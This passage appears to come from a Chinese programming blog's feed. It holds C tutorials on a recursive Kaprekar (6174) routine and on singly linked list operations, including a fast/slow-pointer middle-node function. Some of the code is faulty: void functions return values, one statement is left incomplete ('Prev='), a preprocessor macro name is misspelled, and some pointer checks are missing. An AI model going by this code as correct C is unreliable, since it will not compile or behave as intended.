        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="验证卡布列克运算"><a href="#验证卡布列克运算" class="headerlink" title="验证卡布列克运算"></a>验证卡布列克运算</h1><p>验证卡布列克运算。即：任意一个四位数，只要它们各个位上的数字是不全相同的，就有这样的规律：</p><p>（1）将组成该四位数的四个数字由大到小排列，形成由这四个数字构成的最大的四位数；</p><p>（2）将组成该四位数的四个数字由小到大排列，形成由这四个数字构成的最小的四位数（如果四个数字中含有0，则得到的数不足四位）；</p><p>（3）求两个数的差，得到一个新的四位数（高位零保留）。</p><p>重复以上过程，最后得到的结果总是6174。这个数被称为卡布列克常数。请编写一个递归函数，完成以上的卡布列克运算。</p><p>输入格式要求：”%d” 提示信息：”Enter number:”</p><p>输出格式要求：” [%d]:%d-%d&#x3D;%d\n”</p><p>程序运行示例如下：</p><p>Enter number: 1234</p><p>【1】：4321-1234&#x3D;3087</p><p>【2】：8730-378&#x3D;8352</p><p>【3】：8532-2358&#x3D;6174</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> i,j;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">kabrack</span><span class="params">(<span class="type">int</span> n,<span class="type">int</span> cnt)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> a[<span class="number">4</span>],min,max,temp;</span><br><span class="line">    <span class="comment">//将各位数存进数组</span></span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">4</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        a[i]=n%<span class="number">10</span>;</span><br><span class="line">        n=n/<span class="number">10</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//将数组中数字从大到小排列</span></span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">3</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(j=i+<span class="number">1</span>;j&lt;<span class="number">4</span>;j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(a[i]&lt;a[j])</span><br><span class="line">            &#123;</span><br><span class="line">                temp=a[i];</span><br><span class="line">                a[i]=a[j];</span><br><span class="line">                a[j]=temp;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//计算排列四位数的最大之和最小值</span></span><br><span class="line">    max=<span class="number">1000</span>*a[<span class="number">0</span>]+<span class="number">100</span>*a[<span class="number">1</span>]+<span class="number">10</span>*a[<span class="number">2</span>]+a[<span class="number">3</span>];</span><br><span class="line">    min=<span class="number">1000</span>*a[<span class="number">3</span>]+<span class="number">100</span>*a[<span class="number">2</span>]+<span class="number">10</span>*a[<span class="number">1</span>]+a[<span class="number">0</span>];</span><br><span class="line">    n=max-min;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot; [%d]:%d-%d=%d\n&quot;</span>,cnt,max,min,n);</span><br><span class="line">    <span class="comment">//当结果为0时直接退出</span></span><br><span class="line">    <span class="keyword">if</span>(n==<span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot; [%d]:%d-%d=%04d\n&quot;</span>,cnt,max,min,n);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//得到结果退出</span></span><br><span class="line">    <span class="keyword">if</span>(n==<span class="number">6174</span>)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">    <span class="comment">//没得到继续递归</span></span><br><span class="line">    kabrack(n,cnt+<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> cnt=<span class="number">1</span>,n;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Enter number:&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;n);</span><br><span class="line">    kabrack(n,cnt);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>基础的数组运用。</p>]]></content>
      
      
      <categories>
          
          <category> C语言 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>单项链表基本操作</title>
      <link href="/2023/02/01/%E5%8D%95%E9%A1%B9%E9%93%BE%E8%A1%A8%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/"/>
      <url>/2023/02/01/%E5%8D%95%E9%A1%B9%E9%93%BE%E8%A1%A8%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="头文件-LinkList-h"><a href="#头文件-LinkList-h" class="headerlink" title="头文件 LinkList.h"></a>头文件 LinkList.h</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _CRT_SECURE_NO_WARNINGS</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> once</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> __cplusplus</span></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> &#123;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">// __cplusplus</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//定义节点数据类型</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">LinkNode</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="type">int</span> val;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">LinkNode</span>* <span class="title">next</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//初始化链表</span></span><br><span class="line"><span class="keyword">struct</span> LinkNode* <span class="title function_">Init_LinkList</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//在值oldval处插入一个新数据newval，oldval往后移</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">InsertByValue_LinkList</span><span class="params">(<span class="keyword">struct</span> LinkNode* header,<span class="type">int</span> oldval,<span class="type">int</span> newval)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//删除值为val的结点</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">RemoveByValue_LinkList</span><span class="params">(<span class="keyword">struct</span> LinkNode* header, <span class="type">int</span> delValue)</span>;</span><br><span class="line"><span class="comment">//遍历</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">Foreach_LinkList</span><span class="params">(<span class="keyword">struct</span> LinkNode* header)</span>;</span><br><span class="line"><span class="comment">//销毁链表</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">Destroy_LinkList</span><span class="params">(<span class="keyword">struct</span> LinkNode* header)</span>;</span><br><span class="line"><span class="comment">//清空链表</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">Clear_LinkList</span><span class="params">(<span class="keyword">struct</span> LinkNode* header)</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> __cpluspus</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">// </span></span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="函数文件LinkList-c"><a href="#函数文件LinkList-c" class="headerlink" title="函数文件LinkList.c"></a>函数文件LinkList.c</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&quot;LinkList.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//初始化链表</span></span><br><span class="line"><span class="keyword">struct</span> LinkNode* <span class="title function_">Init_LinkList</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//创建头结点</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">LinkNode</span>* <span class="title">header</span> =</span> <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> LinkNode));</span><br><span class="line">header-&gt;val = - <span class="number">1</span>;<span class="comment">//默认数据不影响</span></span><br><span class="line">header-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//尾部指针</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">LinkNode</span>* <span class="title">pRear</span> =</span> header;</span><br><span class="line"><span class="type">int</span> data = <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">while</span> (<span class="literal">true</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;输入构成的数据：\n&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;data);</span><br><span class="line"><span class="comment">//输入-1结束输入</span></span><br><span class="line"><span class="keyword">if</span> (data == <span class="number">-1</span>)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//创建新节点</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">LinkNode</span>* <span class="title">newnode</span> =</span> <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> LinkNode));</span><br><span class="line">newnode-&gt;val = data;</span><br><span class="line">newnode-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line"><span class="comment">//新结点插入到链表中</span></span><br><span class="line">pRear-&gt;next = newnode;</span><br><span class="line"><span class="comment">//更新尾部指针</span></span><br><span class="line">pRear = newnode;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//将链表返回</span></span><br><span class="line"><span class="keyword">return</span> header;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//在值oldval处插入一个新数据newval，oldval向后移</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">InsertByValue_LinkList</span><span class="params">(<span class="keyword">struct</span> LinkNode* header, <span class="type">int</span> oldval, <span class="type">int</span> newval)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (header == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//创建两个辅助指针变量</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">LinkNode</span>* <span class="title">pPrev</span>=</span>header-&gt;next;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">LinkNode</span>* <span class="title">pCurrent</span> =</span> pPrev-&gt;next;</span><br><span class="line"><span class="keyword">while</span> (pCurrent-&gt;val != oldval)</span><br><span class="line">&#123;</span><br><span class="line">pPrev = pCurrent;</span><br><span class="line">pCurrent = pCurrent-&gt;next;</span><br><span class="line"><span class="keyword">if</span> (pCurrent == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> 0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//如果pCurrent为空，则没有链表中没有符合插入的位置，直接插入到最后</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (pCurrent == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">LinkNode</span>* <span class="title">newnode</span> =</span> <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> LinkNode));</span><br><span class="line">newnode-&gt;val = newval;</span><br><span class="line">newnode-&gt;next = pCurrent;</span><br><span class="line">pPrev-&gt;next = newnode;</span><br><span class="line"><span class="keyword">return</span> header;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//删除值为val的结点</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">RemoveByValue_LinkList</span><span class="params">(<span class="keyword">struct</span> LinkNode* header, <span class="type">int</span> delValue)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (header == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">LinkNode</span>* <span class="title">pPrev</span> =</span> header;</span><br><span class="line"><span class="comment">//创建用于查找要删除数据的指针</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">LinkNode</span>* <span class="title">Find</span> =</span> pPrev-&gt;next;</span><br><span class="line"><span class="keyword">while</span> (Find-&gt;val != delValue)</span><br><span class="line">&#123;</span><br><span class="line">pPrev = pPrev-&gt;next;</span><br><span class="line">Find = Find-&gt;next;</span><br><span class="line"><span class="comment">//未找到直接返回</span></span><br><span class="line"><span class="keyword">if</span> (Find == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//跳过要删除项，将要删除项前后连接</span></span><br><span class="line">pPrev-&gt;next = Find-&gt;next;</span><br><span class="line"><span class="comment">//找到将此块(要删除项)内存域释放</span></span><br><span class="line"><span class="built_in">free</span>(Find);</span><br><span class="line">Find = <span class="literal">NULL</span>;<span class="comment">//防止Find成为野指针</span></span><br><span class="line"><span class="keyword">return</span> header;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//遍历</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">Foreach_LinkList</span><span class="params">(<span class="keyword">struct</span> LinkNode* header)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (header == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//辅助指针</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">LinkNode</span>* <span class="title">pCurrent</span> =</span> header-&gt;next;</span><br><span class="line"><span class="keyword">while</span>(pCurrent)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, pCurrent-&gt;val);</span><br><span class="line">pCurrent = pCurrent-&gt;next;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//销毁链表</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">Destroy_LinkList</span><span class="params">(<span class="keyword">struct</span> LinkNode* header)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (header == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//辅助指针</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">LinkNode</span>* <span class="title">pCurrent</span> =</span> header;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">LinkNode</span>* <span class="title">pNext</span> =</span> pCurrent;</span><br><span class="line"><span class="keyword">while</span> (pCurrent!=<span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">pNext = pCurrent-&gt;next;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d结点被销毁\n&quot;</span>,pCurrent-&gt;val);</span><br><span class="line"><span class="built_in">free</span>(pCurrent);</span><br><span class="line">pCurrent = pNext;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//清空链表</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">Clear_LinkList</span><span class="params">(<span class="keyword">struct</span> LinkNode* header)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (header == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//辅助指针</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">LinkNode</span>* <span class="title">pCurrent</span> =</span> header-&gt;next;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (pCurrent != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//先将pCrrent下一块域保存以便可以访问</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">LinkNode</span>* <span class="title">pNext</span> =</span> pCurrent-&gt;next;</span><br><span class="line"><span class="comment">//释放当前节点内存</span></span><br><span class="line"><span class="built_in">free</span>(pCurrent);</span><br><span class="line"><span class="comment">//更新结点</span></span><br><span class="line">pCurrent = pNext;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">header-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> header;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="主函数用于测试TestLinkList-c"><a href="#主函数用于测试TestLinkList-c" class="headerlink" title="主函数用于测试TestLinkList.c"></a>主函数用于测试TestLinkList.c</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _CRT_SECURE_NO_WARNINGS</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&quot;LinkList.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//测试函数</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">test</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//初始化链表,100,200,300,400,500   插入666，删除666</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">LinkNode</span>* <span class="title">header</span> =</span> Init_LinkList();</span><br><span class="line"><span class="comment">//打印链表</span></span><br><span class="line">Foreach_LinkList(header);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;--------------------------------\n&quot;</span>);</span><br><span class="line"><span class="comment">//插入数据</span></span><br><span class="line">InsertByValue_LinkList(header, <span class="number">500</span>, <span class="number">111</span>);</span><br><span class="line">Foreach_LinkList(header);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;--------------------------------\n&quot;</span>);</span><br><span class="line"><span class="comment">//删除数据</span></span><br><span class="line">RemoveByValue_LinkList(header,<span class="number">111</span>);</span><br><span class="line">Foreach_LinkList(header);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;--------------------------------\n&quot;</span>);</span><br><span class="line"><span class="comment">//清空链表</span></span><br><span class="line">Clear_LinkList(header);</span><br><span class="line">Foreach_LinkList(header);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;--------------------------------\n&quot;</span>);</span><br><span class="line"><span class="comment">//销毁链表</span></span><br><span class="line">Destroy_LinkList(header);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;插入111，再删除111，清空链表并销毁\n&quot;</span>);</span><br><span class="line">test();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="输出结果展示"><a href="#输出结果展示" class="headerlink" title="输出结果展示"></a>输出结果展示</h2><p><img src="/2023/02/01/%E5%8D%95%E9%A1%B9%E9%93%BE%E8%A1%A8%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/LinkNode.png"></p><h1 id="快慢指针"><a href="#快慢指针" class="headerlink" title="快慢指针"></a>快慢指针</h1><p>通过快慢指针可以快速确定链表的中间位置</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> LinkNode* <span class="title function_">middleSpot</span><span class="params">(<span class="keyword">struct</span> LinkNode*head)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">LinkNode</span> *<span class="title">Prev</span>=</span>head;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">LinkNode</span> *<span class="title">Slow</span>=</span>head;</span><br><span class="line">    <span class="keyword">while</span>(Prev!=<span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        Prev=</span><br><span class="line">        <span class="keyword">if</span>(Prev!=<span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            Prev=Prev-&gt;next;</span><br><span class="line">            Slow=Slow-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> Slow;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h3><p><img src="/2023/02/01/%E5%8D%95%E9%A1%B9%E9%93%BE%E8%A1%A8%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/%E5%BF%AB%E6%85%A2%E6%8C%87%E9%92%88.png"></p>]]></content>
      
      
      <categories>
          
          <category> C语言 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C语言 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>排序算法</title>
      <link href="/2023/01/14/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/"/>
      <url>/2023/01/14/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/</url>
      
